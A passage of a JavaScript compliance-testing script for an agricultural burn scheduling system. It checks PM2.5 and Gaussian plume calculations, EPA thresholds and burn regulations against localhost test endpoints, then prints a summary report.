    let complianceIssues = [];
    
    // Test PM2.5 calculation accuracy
    this.testResults.testsRun++;
    try {
      // Mock weather and burn data for testing
      const testBurnData = {
        acres: 100,
        crop_type: 'wheat',
        field_boundary: {
          type: 'Polygon',
          coordinates: [[[-120.5, 37.5], [-120.4, 37.5], [-120.4, 37.6], [-120.5, 37.6], [-120.5, 37.5]]]
        }
      };
      
      const testWeatherData = {
        windSpeed: 10, // mph
        windDirection: 180,
        temperature: 75,
        humidity: 50,
        stabilityClass: 'D'
      };
      
      // Calculate PM2.5 using system's method
      const response = await axios.post('http://localhost:5001/api/test/smoke-prediction', {
        burnData: testBurnData,
        weatherData: testWeatherData
      }, {
        timeout: 10000,
        validateStatus: () => true
      });
      
      if (response.status === 200 && response.data.pm25Concentrations) {
        const systemPM25 = response.data.pm25Concentrations;
        
        // Calculate EPA-compliant PM2.5 using official formulas
        const epaPM25 = this.calculateEPACompliantPM25(testBurnData, testWeatherData);
        
        // Compare calculations
        const deviation = Math.abs((systemPM25[0] - epaPM25[0]) / epaPM25[0]) * 100;
        
        this.testResults.epaCompliance.deviationFromEPA = deviation;
        
        if (deviation > 10) { // More than 10% deviation
          complianceIssues.push({
            type: 'PM2.5 Calculation Inaccuracy',
            systemValue: systemPM25[0],
            epaValue: epaPM25[0],
            deviationPercent: deviation,
            evidence: `System calculation deviates ${deviation.toFixed(1)}% from EPA formula`,
            risk: 'Non-compliant air quality predictions'
          });
          this.testResults.epaCompliance.formulasCorrect = false;
          this.testResults.failed++;
        } else {
          this.testResults.epaCompliance.formulasCorrect = true;
          this.testResults.passed++;
        }
      } else {
        complianceIssues.push({
          type: 'PM2.5 Calculation Unavailable',
          evidence: 'System does not provide PM2.5 calculations',
          risk: 'Cannot verify EPA compliance'
        });
        this.testResults.failed++;
      }
      
    } catch (error) {
      console.warn(`EPA compliance test failed: ${error.message}`);
      complianceIssues.push({
        type: 'PM2.5 Testing Error',
        evidence: error.message,
        risk: 'Cannot verify EPA compliance'
      });
      this.testResults.failed++;
    }
    
    // Test EPA threshold enforcement
    this.testResults.testsRun++;
    const testConcentrations = [
      { value: 30, shouldPass: true, standard: 'daily' },
      { value: 40, shouldPass: false, standard: 'daily' },
      { value: 10, shouldPass: true, standard: 'annual' },
      { value: 15, shouldPass: false, standard: 'annual' },
      { value: 60, shouldPass: false, standard: 'unhealthy' },
      { value: 300, shouldPass: false, standard: 'hazardous' }
    ];
    
    for (const test of testConcentrations) {
      try {
        const response = await axios.post('http://localhost:5001/api/test/epa-threshold', {
          pm25: test.value,
          standard: test.standard
        }, {
          timeout: 5000,
          validateStatus: () => true
        });
        
        const systemResult = response.data?.compliant;
        const expectedResult = test.shouldPass;
        
        if (systemResult !== expectedResult) {
          complianceIssues.push({
            type: 'EPA Threshold Enforcement Error',
            pm25Value: test.value,
            standard: test.standard,
            expected: expectedResult ? 'compliant' : 'non-compliant',
            actual: systemResult ? 'compliant' : 'non-compliant',
            evidence: `Incorrect EPA threshold enforcement for ${test.standard} standard`,
            risk: 'May approve burns that violate EPA standards'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        // If endpoint doesn't exist, that's a compliance issue
        complianceIssues.push({
          type: 'Missing EPA Threshold Checking',
          evidence: 'No EPA threshold validation endpoint available',
          risk: 'Cannot enforce EPA air quality standards'
        });
        this.testResults.failed++;
      }
    }
    
    // Check if system enforces EPA standards
    let thresholdsEnforced = true;
    complianceIssues.forEach(issue => {
      if (issue.type.includes('Threshold')) {
        thresholdsEnforced = false;
      }
    });
    this.testResults.epaCompliance.thresholdsEnforced = thresholdsEnforced;
    
    // Check PM2.5 accuracy  
    this.testResults.epaCompliance.pm25Accurate = this.testResults.epaCompliance.deviationFromEPA < 10;
    
    // Categorize compliance issues
    complianceIssues.forEach(issue => {
      if (issue.type.includes('Calculation') || issue.type.includes('Threshold')) {
        this.testResults.vulnerabilities.critical.push({
          type: `EPA Compliance - ${issue.type}`,
          ...issue
        });
      } else {
        this.testResults.vulnerabilities.high.push({
          type: `EPA Compliance - ${issue.type}`,
          ...issue
        });
      }
    });
    
    console.log(`  ✅ EPA compliance tests completed: ${complianceIssues.length} issues found`);
  }

  calculateEPACompliantPM25(burnData, weatherData) {
    // Simplified EPA-compliant Gaussian plume calculation
    // Based on EPA AP-42 emission factors and standard atmospheric dispersion
    
    const emissionFactor = 2.5; // kg PM2.5 per acre (conservative estimate)
    const emissionRate = burnData.acres * emissionFactor; // kg/hour
    
    const windSpeed = weatherData.windSpeed * 0.44704; // Convert mph to m/s
    const effectiveHeight = 10; // meters (typical agricultural burn height)
    
    // EPA standard dispersion parameters for stability class D (neutral)
    const sigmay = 0.08 * 1000; // Lateral dispersion at 1km (meters)  
    const sigmaz = 0.06 * 1000; // Vertical dispersion at 1km (meters)
    
    // Gaussian plume formula: C = (Q / (π * u * σy * σz)) * exp(-H²/(2*σz²))
    const distance = 1000; // 1km downwind
    const concentration = (emissionRate * 1000) / // Convert kg to g
      (Math.PI * windSpeed * sigmay * sigmaz) *
      Math.exp(-(effectiveHeight * effectiveHeight) / (2 * sigmaz * sigmaz));
    
    // Convert from g/m³ to µg/m³
    const pm25_ugm3 = concentration * 1000000;
    
    return [pm25_ugm3]; // Return as array to match system format
  }

  async testGaussianPlumeAccuracy() {
    console.log('\n🌬️ 9. GAUSSIAN PLUME MODEL ACCURACY TESTS');
    console.log('-'.repeat(50));
    
    let accuracyIssues = [];
    
    // Test against known EPA AERMOD validation cases
    this.testResults.testsRun++;
    const validationCases = [
      {
        name: 'EPA Case 1 - Rural, Stable Conditions',
        emission: 1000, // g/s
        windSpeed: 5, // m/s
        stabilityClass: 'F',
        distance: 1000, // meters
        expectedPM25: 85.2, // µg/m³ (from EPA validation)
        tolerance: 15 // 15% tolerance
      },
      {
        name: 'EPA Case 2 - Urban, Unstable Conditions', 
        emission: 500,
        windSpeed: 10,
        stabilityClass: 'B',
        distance: 500,
        expectedPM25: 12.8,
        tolerance: 15
      },
      {
        name: 'EPA Case 3 - Neutral Conditions',
        emission: 750,
        windSpeed: 7.5,
        stabilityClass: 'D', 
        distance: 2000,
        expectedPM25: 18.4,
        tolerance: 15
      }
    ];
    
    for (const testCase of validationCases) {
      try {
        const response = await axios.post('http://localhost:5001/api/test/gaussian-plume', {
          emissionRate: testCase.emission,
          windSpeed: testCase.windSpeed,
          stabilityClass: testCase.stabilityClass,
          distance: testCase.distance
        }, {
          timeout: 10000,
          validateStatus: () => true
        });
        
        if (response.status === 200 && response.data.concentration) {
          const systemConcentration = response.data.concentration;
          const expectedConcentration = testCase.expectedPM25;
          const deviation = Math.abs((systemConcentration - expectedConcentration) / expectedConcentration) * 100;
          
          if (deviation > testCase.tolerance) {
            accuracyIssues.push({
              type: 'Gaussian Plume Model Inaccuracy',
              testCase: testCase.name,
              systemValue: systemConcentration,
              expectedValue: expectedConcentration,
              deviationPercent: deviation,
              evidence: `Model deviates ${deviation.toFixed(1)}% from EPA validation case`,
              risk: 'Inaccurate smoke dispersion predictions'
            });
            this.testResults.failed++;
          } else {
            this.testResults.passed++;
          }
        } else {
          accuracyIssues.push({
            type: 'Gaussian Plume Model Unavailable',
            testCase: testCase.name,
            evidence: 'System does not provide Gaussian plume calculations',
            risk: 'Cannot validate dispersion model accuracy'
          });
          this.testResults.failed++;
        }
        
      } catch (error) {
        console.warn(`Gaussian plume test failed for ${testCase.name}: ${error.message}`);
        this.testResults.failed++;
      }
    }
    
    // Test stability class determination
    this.testResults.testsRun++;
    const stabilityTestCases = [
      { windSpeed: 2, cloudCover: 10, timeOfDay: 'day', expected: 'A' }, // Very unstable
      { windSpeed: 3, cloudCover: 50, timeOfDay: 'day', expected: 'B' }, // Unstable  
      { windSpeed: 5, cloudCover: 80, timeOfDay: 'day', expected: 'D' }, // Neutral
      { windSpeed: 2, cloudCover: 10, timeOfDay: 'night', expected: 'F' }, // Stable
      { windSpeed: 6, cloudCover: 90, timeOfDay: 'night', expected: 'D' }, // Neutral (high wind)
    ];
    
    for (const test of stabilityTestCases) {
      try {
        const response = await axios.post('http://localhost:5001/api/test/stability-class', test, {
          timeout: 5000,
          validateStatus: () => true
        });
        
        if (response.status === 200) {
          const systemClass = response.data.stabilityClass;
          if (systemClass !== test.expected) {
            accuracyIssues.push({
              type: 'Incorrect Stability Class Determination',
              conditions: test,
              expected: test.expected,
              actual: systemClass,
              evidence: `System determined class ${systemClass}, expected ${test.expected}`,
              risk: 'Incorrect atmospheric stability affects dispersion accuracy'
            });
            this.testResults.failed++;
          } else {
            this.testResults.passed++;
          }
        }
      } catch (error) {
        this.testResults.failed++;
      }
    }
    
    // Categorize accuracy issues
    accuracyIssues.forEach(issue => {
      if (issue.deviationPercent > 25) {
        this.testResults.vulnerabilities.high.push({
          type: `Gaussian Model - ${issue.type}`,
          ...issue
        });
      } else {
        this.testResults.vulnerabilities.medium.push({
          type: `Gaussian Model - ${issue.type}`,
          ...issue  
        });
      }
    });
    
    console.log(`  ✅ Gaussian plume accuracy tests completed: ${accuracyIssues.length} issues found`);
  }

  async testRegulatoryThresholds() {
    console.log('\n📋 10. REGULATORY THRESHOLD TESTS');
    console.log('-'.repeat(50));
    
    let thresholdIssues = [];
    
    // Test burn window restrictions
    this.testResults.testsRun++;
    const restrictedTimes = [
      { hour: 6, shouldReject: true, reason: 'Too early (before 8 AM)' },
      { hour: 19, shouldReject: true, reason: 'Too late (after 6 PM)' },
      { hour: 10, shouldReject: false, reason: 'Within allowed window' },
      { hour: 14, shouldReject: false, reason: 'Within allowed window' }
    ];
    
    for (const timeTest of restrictedTimes) {
      try {
        const response = await axios.post('http://localhost:5001/api/burn-requests', {
          farm_id: 'test_farm',
          burn_date: '2025-08-15',
          time_window_start: `${timeTest.hour.toString().padStart(2, '0')}:00`,
          time_window_end: `${(timeTest.hour + 2).toString().padStart(2, '0')}:00`,
          acres: 50,
          crop_type: 'wheat'
        }, {
          timeout: 10000,
          validateStatus: () => true
        });
        
        const wasRejected = response.status >= 400;
        
        if (timeTest.shouldReject && !wasRejected) {
          thresholdIssues.push({
            type: 'Burn Window Not Enforced',
            time: `${timeTest.hour}:00`,
            reason: timeTest.reason,
            evidence: 'System allowed burn outside permitted hours',
            risk: 'Violations of local burning regulations'
          });
          this.testResults.failed++;
        } else if (!timeTest.shouldReject && wasRejected) {
          thresholdIssues.push({
            type: 'Valid Burn Window Rejected',
            time: `${timeTest.hour}:00`,
            evidence: 'System rejected valid burn time',
            risk: 'Unnecessary restrictions on legitimate burns'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        console.warn(`Burn window test failed: ${error.message}`);
        this.testResults.failed++;
      }
    }
    
    // Test acreage limits
    this.testResults.testsRun++;
    const acreageTests = [
      { acres: 5000, shouldReject: true, reason: 'Exceeds typical daily limit' },
      { acres: 100, shouldReject: false, reason: 'Within normal limits' },
      { acres: -10, shouldReject: true, reason: 'Negative acreage invalid' },
      { acres: 0, shouldReject: true, reason: 'Zero acreage invalid' }
    ];
    
    for (const acreTest of acreageTests) {
      try {
        const response = await axios.post('http://localhost:5001/api/burn-requests', {
          farm_id: 'test_farm',
          burn_date: '2025-08-15',
          time_window_start: '10:00',
          time_window_end: '14:00',
          acres: acreTest.acres,
          crop_type: 'wheat'
        }, {
          timeout: 10000,
          validateStatus: () => true
        });
        
        const wasRejected = response.status >= 400;
        
        if (acreTest.shouldReject && !wasRejected) {
          thresholdIssues.push({
            type: 'Acreage Limit Not Enforced',
            acres: acreTest.acres,
            reason: acreTest.reason,
            evidence: 'System allowed invalid acreage',
            risk: 'Potential for oversized burns'
          });
          this.testResults.failed++;
        } else {
          this.testResults.passed++;
        }
        
      } catch (error) {
        this.testResults.passed++; // Errors expected for invalid inputs
      }
    }
    
    // Test proximity to populations
    this.testResults.testsRun++;
    try {
      const response = await axios.post('http://localhost:5001/api/test/proximity-check', {
        burnLocation: { lat: 37.5, lng: -120.5 },
        populationCenters: [
          { lat: 37.51, lng: -120.51, population: 50000 } // Very close to large population
        ]
      }, {
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status === 200 && response.data.approved) {
        thresholdIssues.push({
          type: 'Population Proximity Not Enforced',
          evidence: 'System approved burn too close to population center',
          risk: 'Public health risk from smoke exposure'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
      
    } catch (error) {
      // Endpoint may not exist - that's a regulatory gap
      thresholdIssues.push({
        type: 'Missing Population Proximity Checks',
        evidence: 'No population proximity validation available',
        risk: 'Cannot enforce safe distances from populated areas'
      });
      this.testResults.failed++;
    }
    
    // Test air quality integration
    this.testResults.testsRun++;
    try {
      const response = await axios.post('http://localhost:5001/api/test/aqi-check', {
        location: { lat: 37.5, lng: -120.5 },
        currentAQI: 180, // Unhealthy level
        burnDate: '2025-08-15'
      }, {
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status === 200 && response.data.approved) {
        thresholdIssues.push({
          type: 'AQI Threshold Not Enforced',
          currentAQI: 180,
          evidence: 'System approved burn during poor air quality conditions',
          risk: 'Exacerbation of existing air quality problems'
        });
        this.testResults.failed++;
      } else {
        this.testResults.passed++;
      }
      
    } catch (error) {
      thresholdIssues.push({
        type: 'Missing AQI Integration',
        evidence: 'No air quality index validation available',
        risk: 'Cannot prevent burns during poor air quality'
      });
      this.testResults.failed++;
    }
    
    // Categorize threshold issues
    thresholdIssues.forEach(issue => {
      if (issue.type.includes('Population') || issue.type.includes('AQI')) {
        this.testResults.vulnerabilities.critical.push({
          type: `Regulatory - ${issue.type}`,
          ...issue
        });
      } else {
        this.testResults.vulnerabilities.medium.push({
          type: `Regulatory - ${issue.type}`,
          ...issue
        });
      }
    });
    
    console.log(`  ✅ Regulatory threshold tests completed: ${thresholdIssues.length} issues found`);
  }

  async cleanupTestEnvironment() {
    console.log('\n🧹 Cleaning up test environment...');
    
    try {
      if (this.connection) {
        await this.connection.execute(`DROP DATABASE IF EXISTS ${this.testDatabase}`);
        await this.connection.end();
        console.log(`✅ Test database '${this.testDatabase}' cleaned up`);
      }
    } catch (error) {
      console.warn(`Cleanup failed: ${error.message}`);
    }
  }

  generateFinalReport() {
    console.log('\n' + '='.repeat(80));
    console.log('🔍 SECURITY & EPA COMPLIANCE SCAN COMPLETE');
    console.log('='.repeat(80));
    
    console.log(`\n📊 TEST SUMMARY:`);
    console.log(`   Tests Run: ${this.testResults.testsRun}`);
    console.log(`   Passed: ${this.testResults.passed}`);
    console.log(`   Failed: ${this.testResults.failed}`);
    
    console.log(`\n🚨 VULNERABILITIES FOUND:`);
    console.log(`   Critical: ${this.testResults.vulnerabilities.critical.length}`);
    console.log(`   High: ${this.testResults.vulnerabilities.high.length}`);
    console.log(`   Medium: ${this.testResults.vulnerabilities.medium.length}`);
    console.log(`   Low: ${this.testResults.vulnerabilities.low.length}`);
    
    console.log(`\n🔐 EXPOSED SECRETS: ${this.testResults.exposedSecrets.length}`);
    
    console.log(`\n🏛️ EPA COMPLIANCE:`);
    console.log(`   PM2.5 Accurate: ${this.testResults.epaCompliance.pm25Accurate ? '✅' : '❌'}`);
    console.log(`   Thresholds Enforced: ${this.testResults.epaCompliance.thresholdsEnforced ? '✅' : '❌'}`);
    console.log(`   Formulas Correct: ${this.testResults.epaCompliance.formulasCorrect ? '✅' : '❌'}`);
    console.log(`   Deviation from EPA: ${this.testResults.epaCompliance.deviationFromEPA.toFixed(1)}%`);
    
    if (this.testResults.vulnerabilities.critical.length > 0) {
      console.log(`\n❌ CRITICAL VULNERABILITIES:`);
      this.testResults.vulnerabilities.critical.forEach((vuln, i) => {
        console.log(`   ${i+1}. ${vuln.type}`);
        console.log(`      Risk: ${vuln.risk}`);
        if (vuln.evidence) console.log(`      Evidence: ${vuln.evidence}`);
      });
    }
    
    if (this.testResults.criticalFailures.length > 0) {
      console.log(`\n💥 CRITICAL FAILURES:`);
      this.testResults.criticalFailures.forEach((failure, i) => {
        console.log(`   ${i+1}. ${failure.error}`);
      });
    }
    
    console.log('\n⚠️  SCAN COMPLETE - VULNERABILITIES IDENTIFIED BUT NOT FIXED');
    console.log('   Review findings and implement appropriate security measures.');
    
    return this.testResults;
  }
}

// Run the scanner if called directly
if (require.main === module) {
  const scanner = new SecurityComplianceScanner();
  scanner.runComprehensiveTests()
    .then(results => {
      console.log('\n📄 Full results object:');
      console.log(JSON.stringify(results, null, 2));
      process.exit(results.vulnerabilities.critical.length > 0 ? 1 : 0);
    })
    .catch(error => {
      console.error('Scanner failed:', error);
      process.exit(1);
    });
}

module.exports = SecurityComplianceScanner;